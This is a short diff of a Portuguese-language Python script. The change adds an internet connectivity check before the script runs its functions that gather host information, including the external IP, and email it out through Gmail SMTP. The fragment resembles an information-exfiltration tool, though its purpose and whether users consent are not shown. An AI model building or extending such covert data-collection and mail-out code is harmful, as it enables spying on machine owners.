@@ -3,6 +3,7 @@ import shutil
 import smtplib
 import socket
 import sys
+import urllib.request
 from os.path import exists
 from pathlib import Path
 from time import sleep
@@ -120,7 +121,21 @@ def obtemInformacao():
     dados.append(ipExterno)
 
 
+def connect(host='https://mail.google.com/'):
+    try:
+        urllib.request.urlopen(host)  # Python 3.x
+        return True
+
+    except:
+        return False
+
+
+# test
+print("connected" if connect() else "erro de conexão!")
+
+
 def enviaInformacao():
+
     result = ''.join(''.join(map(str, tup)) for tup in dados)
     print(result)
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
@@ -130,6 +145,8 @@ def enviaInformacao():
     server.quit()
 
 
-obtemInformacao()
-enviaInformacao()
+while connect():
+    obtemInformacao()
+    enviaInformacao()
+    break
 #
